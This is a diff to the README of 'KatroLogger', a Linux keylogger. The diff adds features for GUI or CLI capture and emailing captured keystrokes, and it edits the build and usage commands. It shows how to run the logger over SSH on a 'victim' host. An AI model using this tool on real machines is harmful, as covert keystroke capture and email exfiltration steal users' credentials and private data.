@@ -1,6 +1,10 @@
 # KatroLogger
 KeyLogger for Linux Systems.
 
+- **Features**
+  - Runs on GUI systems or CLI
+  - Sending data by email
+
 - **Dependencies**
   - curl
   - libx11-dev (Debian-Based)
@@ -8,25 +12,21 @@ KeyLogger for Linux Systems.
 
 - **Compiling**
 ```
-./configure
-make
-make install
+# ./configure
+# make
+# make install
 ```
 - **Usage**
 ```
-katrologger --output /path/file
+# katrologger --output /path/file
 ```
 Send data by e-mail:
 ```
-katrologger --smtp-help
+# katrologger --smtp-help
 ```
 - **Fixing problems accessing via SSH**
 > when connecting to the victim remotely via ssh it will be necessary to export environment variables to run the keylogger.
 
-For hosts without GUI:
-```
-# export GPG_TTY=$(tty)
-```
 For hosts with xorg running:
 > identifying logged in user
 ```
